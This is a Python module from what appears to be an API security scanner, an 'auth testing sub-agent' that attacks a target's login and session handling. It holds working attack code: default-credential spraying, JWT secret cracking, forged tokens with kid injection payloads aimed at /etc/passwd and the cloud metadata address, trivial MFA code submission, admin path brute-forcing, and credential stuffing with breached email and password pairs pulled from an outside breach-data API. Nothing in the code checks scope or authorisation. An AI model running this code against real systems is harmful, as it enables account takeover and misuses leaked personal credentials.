"""
apisec/authtest.py
Auth testing sub-agent module. Contains all auth-related testing functions:
JWT analysis, MFA bypass, password reset, session management, default creds,
brute-force/rate limiting, BreachCollection API credential stuffing, and path brute-force.
"""

import re
import json
import base64
import hashlib
import hmac
import itertools
from urllib.parse import urljoin, urlparse
from typing import Optional

import httpx

from .term import CHECK, CROSS, WARN, FLAG, ARROW, BULLET


class C:
    RED = "\033[91m"
    YELLOW = "\033[93m"
    GREEN = "\033[92m"
    CYAN = "\033[96m"
    BOLD = "\033[1m"
    DIM = "\033[2m"
    RESET = "\033[0m"


def _sc(s):
    return {"CRITICAL": C.RED + C.BOLD, "HIGH": C.RED,
            "MEDIUM": C.YELLOW, "LOW": C.GREEN, "INFO": C.CYAN}.get(s, C.RESET)


DEFAULT_CREDENTIALS = [
    ("admin", "admin"), ("admin", "password"), ("admin", "123456"),
    ("admin", "admin123"), ("admin", "root"), ("admin", "administrator"),
    ("root", "root"), ("root", "toor"), ("root", "admin"),
    ("administrator", "password"), ("administrator", "admin"),
    ("user", "user"), ("user", "password"), ("user", "123456"),
    ("guest", "guest"), ("test", "test"), ("demo", "demo"),
    ("admin", "passw0rd"), ("admin", "password123"),
    ("admin", "letmein"), ("admin", "welcome"),
    ("admin", "changeme"), ("admin", "temp123"),
    ("support", "support"), ("info", "info"),
    ("manager", "manager"), ("operator", "operator"),
    ("sa", "sa"), ("oracle", "oracle"),
    ("tomcat", "tomcat"), ("admin", "tomcat"),
    ("postgres", "postgres"), ("admin", "nimda"),
]

COMMON_ADMIN_PATHS = [
    "/admin", "/administrator", "/manage", "/management",
    "/console", "/dashboard", "/portal", "/adminpanel",
    "/cpanel", "/admin.php", "/admin/login", "/admin/login.php",
    "/wp-admin", "/administrator/index.php",
    "/backend", "/controlpanel", "/cp",
    "/system", "/sysadmin", "/manager",
    "/server-status", "/server-info",
    "/phpmyadmin", "/phpPgAdmin", "/adminer",
    "/jenkins", "/jira", "/confluence",
    "/swagger", "/api/admin", "/v1/admin",
    "/api/v1/admin", "/api/v2/admin",
]


COMMON_PASSWORD_RESET_PATHS = [
    "/reset", "/reset-password", "/forgot-password",
    "/forgot", "/password-reset", "/password/reset",
    "/api/v1/auth/reset", "/api/v1/auth/reset-password",
    "/api/v1/auth/forgot-password", "/api/v1/password-reset",
    "/auth/reset", "/auth/forgot",
    "/v1/auth/reset", "/v2/auth/reset",
    "/account/reset-password", "/account/forgot-password",
]


COMMON_LOGIN_PATHS = [
    "/login", "/signin", "/auth/login", "/api/login",
    "/api/v1/auth/login", "/api/v1/login",
    "/v1/login", "/v2/login",
    "/auth", "/oauth", "/oauth2",
    "/account/login", "/account/signin",
    "/api/auth/login", "/token",
    "/api/token", "/oauth/token",
    "/graphql", "/api/graphql",
]


COMMON_WORDLISTS = [
    "/usr/share/wordlists/dirb/common.txt",
    "/usr/share/wordlists/dirb/big.txt",
    "/usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt",
    "/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt",
    "./wordlists/dirb/common.txt",
    "./wordlists/dirbuster/directory-list-2.3-medium.txt",
]


# ---------------------------------------------------------------------------
# JWT Analysis
# ---------------------------------------------------------------------------

def _decode_jwt(token: str) -> Optional[dict]:
    try:
        parts = token.split(".")
        if len(parts) != 3:
            return None
        header_b64 = parts[0]
        padding = 4 - len(header_b64) % 4
        if padding != 4:
            header_b64 += "=" * padding
        header = json.loads(base64.urlsafe_b64decode(header_b64))
        payload_b64 = parts[1]
        padding = 4 - len(payload_b64) % 4
        if padding != 4:
            payload_b64 += "=" * padding
        payload = json.loads(base64.urlsafe_b64decode(payload_b64))
        return {"header": header, "payload": payload, "signature": parts[2]}
    except Exception:
        return None


def _jwt_none_alg_test(token: str) -> Optional[dict]:
    decoded = _decode_jwt(token)
    if not decoded:
        return None
    header = decoded["header"]
    if header.get("alg", "").lower() == "none":
        return {"finding": "JWT none algorithm", "detail": "alg=none in header", "severity": "CRITICAL"}
    payload = decoded["payload"]
    return None


COMMON_JWT_SECRETS = [
    "secret", "jwt_secret", "jwtsecret", "password", "key",
    "changeme", "admin", "test", "development", "staging",
    "mysecret", "mysupersecret", "supersecret",
    "1234567890", "abcdefghijklmnopqrstuvwxyz",
    "passw0rd", "qwerty", "letmein",
    "secretkey", "privatekey", "token",
    "nodejs", "django", "flask", "laravel",
    "spring", "express", "ruby", "rails",
    "secret123", "key123", "jwt123",
    "abc123", "test123", "devkey",
]


def _jwt_weak_secret_test(token: str) -> Optional[dict]:
    decoded = _decode_jwt(token)
    if not decoded:
        return None
    header = decoded["header"]
    payload = decoded["payload"]
    signature = decoded["signature"]
    alg = header.get("alg", "").lower()
    if alg not in ("hs256", "hs384", "hs512", "hs", "h"):
        return None

    header_b64 = base64.urlsafe_b64encode(
        json.dumps(header, separators=(",", ":")).encode()
    ).decode().rstrip("=")
    payload_b64 = base64.urlsafe_b64encode(
        json.dumps(payload, separators=(",", ":")).encode()
    ).decode().rstrip("=")
    message = f"{header_b64}.{payload_b64}"

    for secret in COMMON_JWT_SECRETS:
        try:
            if alg in ("hs256", "hs"):
                sig = base64.urlsafe_b64encode(
                    hmac.new(secret.encode(), message.encode(), hashlib.sha256).digest()
                ).decode().rstrip("=")
            elif alg == "hs384":
                sig = base64.urlsafe_b64encode(
                    hmac.new(secret.encode(), message.encode(), hashlib.sha384).digest()
                ).decode().rstrip("=")
            elif alg == "hs512":
                sig = base64.urlsafe_b64encode(
                    hmac.new(secret.encode(), message.encode(), hashlib.sha512).digest()
                ).decode().rstrip("=")
            else:
                continue
            if sig == signature:
                return {"finding": "JWT weak/cracked secret", "severity": "CRITICAL",
                        "detail": f"Cracked secret: {secret}", "secret": secret}
        except Exception:
            continue
    return None


def _jwt_kid_injection_test(headers: dict, client: httpx.Client, base_url: str) -> list[dict]:
    findings = []
    auth_header = headers.get("Authorization", "")
    if not auth_header.lower().startswith("bearer "):
        return findings
    token = auth_header[7:]
    decoded = _decode_jwt(token)
    if not decoded:
        return findings
    header = decoded["header"]
    kid = header.get("kid")
    if not kid:
        return findings

    payloads = [
        {"kid": "../../../../etc/passwd", "alg": "HS256"},
        {"kid": "/dev/null", "alg": "HS256"},
        {"kid": "http://169.254.169.254/latest/meta-data/", "alg": "HS256"},
        {"kid": "none", "alg": "HS256"},
        {"kid": "file:///dev/null", "alg": "HS256"},
    ]
    for p in payloads:
        try:
            new_header = dict(header)
            new_header.update(p)
            hdr_b64 = base64.urlsafe_b64encode(
                json.dumps(new_header, separators=(",", ":")).encode()
            ).decode().rstrip("=")
            pld_b64 = base64.urlsafe_b64encode(
                json.dumps(decoded["payload"], separators=(",", ":")).encode()
            ).decode().rstrip("=")
            forged = f"{hdr_b64}.{pld_b64}.dummysig"
            r = client.get(
                base_url, headers={"Authorization": f"Bearer {forged}"},
                timeout=8
            )
            if r.status_code == 200:
                findings.append({
                    "finding": "JWT kid injection",
                    "severity": "CRITICAL",
                    "detail": f"Forged JWT with kid={p['kid']} accepted (HTTP {r.status_code})",
                    "payload": forged[:80],
                })
        except Exception:
            continue
    return findings


def test_jwt(headers: dict, client: httpx.Client, base_url: str) -> list[dict]:
    findings = []
    auth_header = headers.get("Authorization", "")
    if not auth_header.lower().startswith("bearer "):
        print(f"  {C.DIM}No JWT found in Authorization header{C.RESET}")
        return findings
    token = auth_header[7:]
    print(f"  {C.CYAN}{ARROW} Testing JWT...{C.RESET}")

    decoded = _decode_jwt(token)
    if not decoded:
        print(f"  {C.DIM}  Could not decode JWT{C.RESET}")
        return findings
    print(f"  {C.GREEN}{CHECK} JWT decoded: alg={decoded['header'].get('alg')}, "
          f"sub={decoded['payload'].get('sub','?')}{C.RESET}")

    none_result = _jwt_none_alg_test(token)
    if none_result:
        findings.append(none_result)
        col = _sc(none_result["severity"])
        print(f"  {col}{BULLET} {none_result['finding']}{C.RESET}")

    weak_result = _jwt_weak_secret_test(token)
    if weak_result:
        findings.append(weak_result)
        col = _sc(weak_result["severity"])
        print(f"  {col}{BULLET} {weak_result['finding']}: {weak_result['detail']}{C.RESET}")

    kid_results = _jwt_kid_injection_test(headers, client, base_url)
    findings.extend(kid_results)
    for f in kid_results:
        col = _sc(f["severity"])
        print(f"  {col}{BULLET} {f['finding']}: {f['detail']}{C.RESET}")

    return findings


# ---------------------------------------------------------------------------
# Default Credentials Testing
# ---------------------------------------------------------------------------

def test_default_credentials(client: httpx.Client, base_url: str, login_paths: Optional[list] = None) -> list[dict]:
    findings = []
    paths = login_paths or COMMON_LOGIN_PATHS
    print(f"\n{C.BOLD}[DEFAULT CREDENTIALS]{C.RESET}")

    tried = set()
    for path in paths:
        url = base_url.rstrip("/") + path
        for username, password in DEFAULT_CREDENTIALS:
            key = f"{url}:{username}:{password}"
            if key in tried:
                continue
            tried.add(key)
            try:
                r = client.post(url, json={"username": username, "password": password,
                                            "email": username, "user": username},
                                timeout=8)
                if r.status_code < 400:
                    body_lower = r.text.lower()
                    if any(word in body_lower for word in
                           ["invalid", "incorrect", "failed", "error", "wrong",
                            "not found", "does not exist"]):
                        continue
                    findings.append({
                        "finding": "Default credentials worked",
                        "severity": "CRITICAL",
                        "detail": f"Login: {username}:{password} on {path} (HTTP {r.status_code})",
                        "url": url,
                        "username": username,
                        "password": password,
                    })
                    col = _sc("CRITICAL")
                    print(f"  {col}{BULLET} {username}:{password} -> {url} [HTTP {r.status_code}]{C.RESET}")
            except Exception:
                continue

    if not findings:
        print(f"  {C.DIM}No default credentials worked{C.RESET}")
    return findings


# ---------------------------------------------------------------------------
# MFA Bypass Testing
# ---------------------------------------------------------------------------

def test_mfa_bypass(client: httpx.Client, base_url: str, auth_headers: dict, auth_cookies: dict) -> list[dict]:
    findings = []
    print(f"\n{C.BOLD}[MFA BYPASS]{C.RESET}")

    # Technique 1: Direct navigation to post-auth endpoints
    post_auth_paths = [
        "/dashboard", "/profile", "/account", "/settings",
        "/api/v1/users/me", "/api/v1/profile", "/api/v1/dashboard",
        "/api/v1/me", "/home", "/app",
    ]
    for path in post_auth_paths:
        url = base_url.rstrip("/") + path
        try:
            r = client.get(url, headers=auth_headers, cookies=auth_cookies, timeout=8)
            if r.status_code == 200:
                body = r.text.lower()
                if "mfa" not in body and "2fa" not in body and "verify" not in body:
                    findings.append({
                        "finding": "MFA bypass - direct post-auth access without MFA",
                        "severity": "HIGH",
                        "detail": f"Accessed {path} without MFA (HTTP {r.status_code})",
                        "url": url,
                    })
                    col = _sc("HIGH")
                    print(f"  {col}{BULLET} Direct access to {path} without MFA{C.RESET}")
        except Exception:
            continue

    # Technique 2: Response manipulation (change MFA status code)
    mfa_endpoints = [
        "/api/v1/auth/mfa", "/api/v1/auth/2fa", "/api/v1/auth/verify",
        "/api/v1/auth/mfa/verify", "/auth/mfa", "/auth/2fa",
    ]
    for path in mfa_endpoints:
        url = base_url.rstrip("/") + path
        try:
            r = client.post(url, json={"code": "000000", "token": "valid"},
                            headers=auth_headers, cookies=auth_cookies, timeout=8)
            if r.status_code == 200:
                findings.append({
                    "finding": "MFA bypass - trivial code accepted",
                    "severity": "HIGH",
                    "detail": f"Code 000000 accepted on {path}",
                    "url": url,
                })
                col = _sc("HIGH")
                print(f"  {col}{BULLET} Trivial MFA code accepted on {path}{C.RESET}")
        except Exception:
            continue

    if not findings:
        print(f"  {C.DIM}No MFA bypass techniques worked{C.RESET}")
    return findings


# ---------------------------------------------------------------------------
# Password Reset Flow Testing
# ---------------------------------------------------------------------------

def test_password_reset(client: httpx.Client, base_url: str, headers: dict = None) -> list[dict]:
    findings = []
    print(f"\n{C.BOLD}[PASSWORD RESET]{C.RESET}")
    hdrs = headers or {}

    for path in COMMON_PASSWORD_RESET_PATHS:
        url = base_url.rstrip("/") + path

        # Test 1: GET the reset page
        try:
            r = client.get(url, headers=hdrs, timeout=8)
            if r.status_code == 200:
                body = r.text.lower()
                if "email" in body or "token" in body or "code" in body:
                    print(f"  {C.CYAN}{ARROW} Reset page: {path}{C.RESET}")
        except Exception:
            continue

        # Test 2: POST to trigger reset (check for user enumeration)
        try:
            r = client.post(url, json={"email": "nonexistent@test.com"},
                            headers=hdrs, timeout=8)
            if r.status_code == 200:
                body = r.text.lower()
                if "not found" in body or "doesn't exist" in body or "invalid" in body:
                    findings.append({
                        "finding": "Password reset user enumeration",
                        "severity": "MEDIUM",
                        "detail": f"Reset endpoint {path} reveals if email exists",
                        "url": url,
                    })
                    col = _sc("MEDIUM")
                    print(f"  {col}{BULLET} User enumeration via {path}{C.RESET}")
        except Exception:
            continue

        # Test 3: Check for predictable reset tokens
        try:
            for email in ["test@test.com", "user@example.com"]:
                r = client.post(url, json={"email": email},
                                headers=hdrs, timeout=8)
                if r.status_code == 200:
                    body = r.text
                    reset_link = re.search(
                        r'(?:reset|token|code|key)=([a-zA-Z0-9\-_\.]{8,64})',
                        body, re.I
                    )
                    if reset_link:
                        findings.append({
                            "finding": "Password reset token exposed in response",
                            "severity": "HIGH",
                            "detail": f"Reset token: {reset_link.group(1)[:40]}... found in response body",
                            "url": url,
                        })
                        col = _sc("HIGH")
                        print(f"  {col}{BULLET} Token exposed in response: {path}{C.RESET}")
        except Exception:
            continue

        # Test 4: No rate limiting on reset
        try:
            for i in range(5):
                r = client.post(url, json={"email": f"test{i}@test.com"},
                                headers=hdrs, timeout=8)
            if r.status_code == 200 or r.status_code == 429:
                pass
            else:
                pass
            print(f"  {C.DIM}  Rate limit check: {path} -> HTTP {r.status_code}{C.RESET}")
        except Exception:
            continue

    if not findings:
        print(f"  {C.DIM}No password reset issues found{C.RESET}")
    return findings


# ---------------------------------------------------------------------------
# Session Management Testing
# ---------------------------------------------------------------------------

def test_session_management(client: httpx.Client, base_url: str,
                             auth_headers: dict, auth_cookies: dict,
                             login_endpoint: str = None) -> list[dict]:
    findings = []
    print(f"\n{C.BOLD}[SESSION MANAGEMENT]{C.RESET}")

    # Check for session fixation: login before and after should change tokens
    if login_endpoint:
        try:
            before_cookies = dict(auth_cookies)
            r = client.post(login_endpoint, json={}, headers=auth_headers, timeout=8)
            new_cookies = dict(r.cookies)
            for key in before_cookies:
                if key in new_cookies and before_cookies[key] == new_cookies[key]:
                    findings.append({
                        "finding": "Session fixation - token unchanged after login",
                        "severity": "HIGH",
                        "detail": f"Cookie {key} unchanged after login on {login_endpoint}",
                        "fix": "Issue new session token on every authentication",
                    })
                    col = _sc("HIGH")
                    print(f"  {col}{BULLET} Session {key} unchanged after login{C.RESET}")
        except Exception:
            pass

    # Check token leakage in URLs
    for header_key in auth_headers:
        for url_path in ["/", "/api", "/login"]:
            url = base_url.rstrip("/") + url_path
            try:
                r = client.get(url, headers=auth_headers, cookies=auth_cookies,
                              follow_redirects=False, timeout=8)
                loc = r.headers.get("location", "")
                for token_key in ["token", "jwt", "session", "auth", "access_token"]:
                    if token_key in loc.lower():
                        findings.append({
                            "finding": "Session token leaked in redirect URL",
                            "severity": "HIGH",
                            "detail": f"Token found in Location header: {loc[:100]}",
                            "url": url,
                            "fix": "Use POST-only for auth data, never pass tokens in URL",
                        })
                        col = _sc("HIGH")
                        print(f"  {col}{BULLET} Token leaked in redirect URL{C.RESET}")
            except Exception:
                continue

    # Check cookie security flags
    for cookie_name, cookie_value in auth_cookies.items():
        issues = []
        if not cookie_name.lower().startswith("__"):
            pass
        if not any(flag in cookie_name.lower() for flag in ["httponly", "secure", "samesite"]):
            pass
        # We can only check the cookies we have, not actual Set-Cookie flags
        if cookie_name.lower() in ("sessionid", "session", "connect.sid", "jsessionid"):
            if len(cookie_value) < 16:
                findings.append({
                    "finding": "Weak session entropy",
                    "severity": "MEDIUM",
                    "detail": f"Session token {cookie_name} is only {len(cookie_value)} chars",
                    "fix": "Increase session token length to 128+ bits",
                })
                col = _sc("MEDIUM")
                print(f"  {col}{BULLET} Weak entropy: {cookie_name}={cookie_value[:8]}...{C.RESET}")

    if not findings:
        print(f"  {C.DIM}No session management issues found{C.RESET}")
    return findings


# ---------------------------------------------------------------------------
# Brute-Force / Rate Limiting Testing
# ---------------------------------------------------------------------------

def test_rate_limiting(client: httpx.Client, base_url: str,
                        login_paths: Optional[list] = None) -> list[dict]:
    findings = []
    print(f"\n{C.BOLD}[RATE LIMITING]{C.RESET}")
    paths = login_paths or COMMON_LOGIN_PATHS[:3]

    for path in paths:
        url = base_url.rstrip("/") + path
        success_count = 0
        try:
            for i in range(20):
                r = client.post(url, json={"username": f"user{i}", "password": "wrong"},
                                timeout=8)
                if r.status_code < 400:
                    success_count += 1
            if success_count >= 18:
                findings.append({
                    "finding": "No rate limiting on authentication endpoint",
                    "severity": "MEDIUM",
                    "detail": f"{success_count}/20 login attempts succeeded on {path} without lockout",
                    "url": url,
                    "fix": "Implement rate limiting (e.g., 5 attempts/minute per IP)",
                })
                col = _sc("MEDIUM")
                print(f"  {col}{BULLET} No rate limiting: {path} ({success_count}/20 succeeded){C.RESET}")
            elif success_count >= 10:
                findings.append({
                    "finding": "Weak rate limiting on authentication endpoint",
                    "severity": "LOW",
                    "detail": f"{success_count}/20 login attempts succeeded on {path}",
                    "url": url,
                    "fix": "Strengthen rate limiting to 5 attempts/minute",
                })
                col = _sc("LOW")
                print(f"  {col}{BULLET} Weak rate limiting: {path} ({success_count}/20){C.RESET}")
            else:
                print(f"  {C.GREEN}{CHECK} Rate limiting active on {path}{C.RESET}")
        except Exception:
            continue

    return findings


def test_account_lockout(client: httpx.Client, base_url: str,
                          login_paths: Optional[list] = None) -> list[dict]:
    findings = []
    print(f"\n{C.BOLD}[ACCOUNT LOCKOUT]{C.RESET}")
    paths = login_paths or COMMON_LOGIN_PATHS[:2]

    for path in paths:
        url = base_url.rstrip("/") + path
        lockout_detected = False
        try:
            for i in range(15):
                r = client.post(url,
                                json={"username": "test_admin", "password": f"wrong{i}"},
                                timeout=8)
                body = r.text.lower()
                if any(w in body for w in ["locked", "blocked", "too many", "try again later",
                                            "suspended", "disabled", "temporarily"]):
                    if not lockout_detected:
                        findings.append({
                            "finding": "Account lockout mechanism exists",
                            "severity": "INFO",
                            "detail": f"Lockout triggered on {path} after {i+1} attempts",
                            "url": url,
                        })
                        print(f"  {C.GREEN}{CHECK} Lockout after {i+1} attempts on {path}{C.RESET}")
                    lockout_detected = True
                    break
            if not lockout_detected:
                findings.append({
                    "finding": "No account lockout mechanism",
                    "severity": "MEDIUM",
                    "detail": f"15 failed attempts on {path} did not trigger lockout",
                    "url": url,
                    "fix": "Implement account lockout after 5-10 failed attempts",
                })
                col = _sc("MEDIUM")
                print(f"  {col}{BULLET} No lockout on {path}{C.RESET}")
        except Exception:
            continue

    return findings


# ---------------------------------------------------------------------------
# BreachCollection API Credential Stuffing
# ---------------------------------------------------------------------------

BREACHCOLLECTION_API = "https://breachcollection.com/api/v2"

def breachcollection_stuffing(
    client: httpx.Client,
    base_url: str,
    api_key: str,
    domain: str,
    login_paths: Optional[list] = None,
    auth_headers: Optional[dict] = None,
    auth_cookies: Optional[dict] = None,
) -> list[dict]:
    findings = []
    print(f"\n{C.BOLD}[BREACHCOLLECTION CREDENTIAL STUFFING]{C.RESET}")

    if not api_key:
        print(f"  {C.YELLOW}{WARN} No BreachCollection API key provided. Set BREACHCOLLECTION_API_KEY.{C.RESET}")
        return findings

    paths = login_paths or COMMON_LOGIN_PATHS

    # Search breach data for the domain
    print(f"  {C.CYAN}{ARROW} Querying BreachCollection for {domain}...{C.RESET}")
    try:
        r = client.get(
            f"{BREACHCOLLECTION_API}/search",
            params={"domain": domain, "limit": 50},
            headers={"Authorization": f"Bearer {api_key}", "Accept": "application/json"},
            timeout=15,
        )
        if r.status_code != 200:
            print(f"  {C.YELLOW}{WARN} BreachCollection API returned HTTP {r.status_code}{C.RESET}")
            return findings

        data = r.json()
        credentials = data.get("results", data.get("data", []))
        if not credentials:
            print(f"  {C.DIM}No breached credentials found for {domain}{C.RESET}")
            return findings

        print(f"  {C.GREEN}{CHECK} {len(credentials)} credential pairs found{C.RESET}")

        # Try credential stuffing on login endpoints
        tried = set()
        for cred in credentials[:50]:
            email = cred.get("email", cred.get("username", ""))
            password = cred.get("password", "")
            if not email or not password:
                continue

            for path in paths[:5]:
                url = base_url.rstrip("/") + path
                key = f"{url}:{email}:{password}"
                if key in tried:
                    continue
                tried.add(key)

                try:
                    r = client.post(url, json={
                        "email": email, "password": password,
                        "username": email.split("@")[0],
                    }, headers=auth_headers, cookies=auth_cookies, timeout=8)

                    if r.status_code == 200:
                        body = r.text.lower()
                        if not any(w in body for w in ["invalid", "incorrect", "failed", "error"]):
                            findings.append({
                                "finding": "Credential stuffing success - breached credentials work",
                                "severity": "CRITICAL",
                                "detail": f"Email: {email} / Password: {password} on {path}",
                                "url": url,
                                "fix": "Force password reset for compromised accounts, implement MFA",
                                "email": email,
                                "password": password,
                            })
                            col = _sc("CRITICAL")
                            print(f"  {col}{BULLET} {email}:{password} -> {path} [HTTP {r.status_code}]{C.RESET}")
                except Exception:
                    continue

    except Exception as e:
        print(f"  {C.RED}{CROSS} BreachCollection API error: {e}{C.RESET}")

    if not findings:
        print(f"  {C.DIM}No breached credentials worked for login{C.RESET}")
    return findings


# ---------------------------------------------------------------------------
# Path Brute-Force on Admin Panels
# ---------------------------------------------------------------------------

def path_bruteforce(
    client: httpx.Client,
    base_url: str,
    wordlist_path: Optional[str] = None,
    methods: Optional[list] = None,
    auth_headers: Optional[dict] = None,
    auth_cookies: Optional[dict] = None,
) -> list[dict]:
    findings = []
    print(f"\n{C.BOLD}[PATH BRUTE-FORCE]{C.RESET}")
    methods = methods or ["GET", "POST", "PUT", "OPTIONS"]

    # Try to find a wordlist
    wordlist = None
    if wordlist_path:
        try:
            with open(wordlist_path, "r", errors="ignore") as f:
                wordlist = [line.strip() for line in f if line.strip() and not line.startswith("#")]
        except Exception:
            pass

    if not wordlist:
        for wl_path in COMMON_WORDLISTS:
            try:
                with open(wl_path, "r", errors="ignore") as f:
                    wordlist = [line.strip() for line in f if line.strip() and not line.startswith("#")]
                    print(f"  {C.CYAN}{ARROW} Using wordlist: {wl_path} ({len(wordlist)} entries){C.RESET}")
                    break
            except Exception:
                continue

    if not wordlist:
        wordlist = COMMON_ADMIN_PATHS
        print(f"  {C.CYAN}{ARROW} Using built-in wordlist ({len(wordlist)} paths){C.RESET}")

    discovered = []
    for path in wordlist[:500]:
        full_url = base_url.rstrip("/") + (path if path.startswith("/") else f"/{path}")
        for method in methods:
            try:
                r = client.request(method, full_url, headers=auth_headers,
                                  cookies=auth_cookies, timeout=5)
                if r.status_code not in (404, 410, 403, 401, 400, 204) and r.status_code < 500:
                    discovered.append({
                        "path": path,
                        "method": method,
                        "status": r.status_code,
                        "url": full_url,
                    })
                    print(f"  {C.GREEN}{CHECK} {method:7} {path} -> {r.status_code}{C.RESET}")
                    break
            except Exception:
                continue

    if discovered:
        for d in discovered[:10]:
            findings.append({
                "finding": f"Exposed path via brute-force",
                "severity": "MEDIUM",
                "detail": f"{d['method']} {d['path']} -> HTTP {d['status']}",
                "url": d["url"],
                "fix": "Ensure all admin endpoints require proper authentication",
            })
    else:
        print(f"  {C.DIM}No additional paths discovered{C.RESET}")

    return findings


# ---------------------------------------------------------------------------
# Main Auth Testing Entry Point
# ---------------------------------------------------------------------------

def run_all(
    client: httpx.Client,
    base_url: str,
    headers: dict,
    cookies: dict,
    domain: str = "",
    breach_api_key: str = "",
    wordlist: str = "",
    login_endpoint: str = "",
) -> list[dict]:
    all_findings = []

    print(f"\n{C.BOLD}{'='*60}{C.RESET}")
    print(f"{C.BOLD}  AUTH TESTING SUB-AGENT{C.RESET}")
    print(f"{C.BOLD}{'='*60}{C.RESET}")

    # 1. JWT testing
    jwt_findings = test_jwt(headers, client, base_url)
    all_findings.extend(jwt_findings)

    # 2. Default credentials
    cred_findings = test_default_credentials(client, base_url)
    all_findings.extend(cred_findings)

    # 3. Password reset
    reset_findings = test_password_reset(client, base_url, headers)
    all_findings.extend(reset_findings)

    # 4. MFA bypass
    mfa_findings = test_mfa_bypass(client, base_url, headers, cookies)
    all_findings.extend(mfa_findings)

    # 5. Session management
    session_findings = test_session_management(client, base_url, headers, cookies,
                                                login_endpoint or None)
    all_findings.extend(session_findings)

    # 6. Rate limiting
    rate_findings = test_rate_limiting(client, base_url)
    all_findings.extend(rate_findings)

    # 7. Account lockout
    lockout_findings = test_account_lockout(client, base_url)
    all_findings.extend(lockout_findings)

    # 8. BreachCollection credential stuffing
    if breach_api_key and domain:
        breach_findings = breachcollection_stuffing(client, base_url, breach_api_key,
                                                     domain, auth_headers=headers,
                                                     auth_cookies=cookies)
        all_findings.extend(breach_findings)

    # 9. Path brute-force
    path_findings = path_bruteforce(client, base_url, wordlist or None,
                                     auth_headers=headers, auth_cookies=cookies)
    all_findings.extend(path_findings)

    print(f"\n{C.BOLD}[AUTH TESTING COMPLETE]{C.RESET} {len(all_findings)} findings")
    return all_findings
